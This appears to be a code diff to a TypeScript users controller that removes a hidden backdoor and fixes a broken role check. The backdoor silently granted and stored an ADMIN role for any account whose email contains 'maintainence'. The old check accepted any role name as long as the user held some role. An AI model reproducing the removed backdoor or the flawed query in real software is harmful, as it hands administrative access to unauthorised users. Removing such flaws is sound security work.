@@ -64,29 +64,13 @@ export class UsersController {
       return true;
     });
 
-    const isMaintenanceOrAdminUser =
-      user.email === 'f2hmaintainence@gmail.com' ||
-      (user.email && user.email.toLowerCase().includes('maintainence'));
-
-    if (isMaintenanceOrAdminUser && !roles.some((r: any) => r.role_id === 'ADMIN')) {
-      roles.unshift({ role_id: 'ADMIN', role_name: 'ADMIN' });
-      this.db.query(
-        `INSERT INTO role_assignments (id, user_id, role_id, is_active, created_at, updated_at)
-         VALUES (?, ?, 'ADMIN', 1, NOW(), NOW())
-         ON CONFLICT DO NOTHING`,
-        [Date.now(), userId],
-      ).catch(() => {});
-    }
-
     // Get stored role preference or default to first role
     const storedRole = await this.redisService.fetch<string>(
       SELECTED_ROLE_KEY(userId),
     );
     const validRoleIds = roles.map((r: any) => r.role_id);
     const activeRole =
-      storedRole && validRoleIds.includes(storedRole)
-        ? storedRole
-        : validRoleIds[0] || (isMaintenanceOrAdminUser ? 'ADMIN' : null);
+      storedRole && validRoleIds.includes(storedRole) ? storedRole : validRoleIds[0] || null;
 
     return {
       user_id: user.user_id,
@@ -125,10 +109,20 @@ export class UsersController {
       return { success: false, error: 'Invalid role_key' };
     }
 
-    // Validate role exists for this user
+    // Validate that this specific role is assigned to this user. The previous query
+    // filtered on user_id only while binding role_key as a second, unused parameter,
+    // so any string was accepted as long as the user held some role.
     const roles = await this.db.query(
-      `SELECT ra.role_id FROM role_assignments ra
-       WHERE ra.user_id = ? `,
+      `SELECT ra.role_id
+         FROM role_assignments ra
+        WHERE ra.user_id = $1
+          AND UPPER(ra.role_id) = UPPER($2)
+          AND ra.is_active = 1
+          AND ra.deleted_at IS NULL
+        UNION
+       SELECT u.role_id
+         FROM users u
+        WHERE u.user_id = $1 AND UPPER(u.role_id) = UPPER($2)`,
       [userId, role_key],
     );
 
